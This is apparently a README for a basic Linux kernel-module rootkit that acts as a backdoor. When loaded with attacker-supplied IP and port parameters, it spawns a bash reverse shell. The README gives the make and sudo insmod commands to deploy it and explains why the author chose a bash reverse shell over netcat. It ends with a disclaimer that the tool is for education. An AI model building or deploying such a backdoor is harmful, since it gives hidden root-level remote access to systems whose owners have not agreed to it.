# ReverseSh3LL_As_R00tkit (RAR)

A very basic rootkit which takes two params lhost_ip and lhost_port while loading module into kernel.
To compile it you will have to install kernel-header files for targeted kernel version for which you are trying to build this module. Default values for ip and port are 127.0.0.1 and 4444 repectively.

# Usage

```bash
make
sudo insmod revShell_kmodule_backdoor.ko lhost_ip="XXX.XXX.XXX.XXX" lhost_port="ABCDE"
```

# Updates and acknowledgement

As per the suggestion from [TotallyNotAHaxxer](https://github.com/TotallyNotAHaxxer) switched to snprintf() and abandoned hacky strcat() way building command string. After some brainstorming we decided to stick to purely bash invoked reverse shell instead of netcat. Because -e option got removed from openbsd one and one from Nmap does not play nice under kernel process.

__Note: Don't use this code for illegal activities, it is only meant to teach about rootkits in cyber security education point of view. I am not responsible for any harm to unauthorised system.__
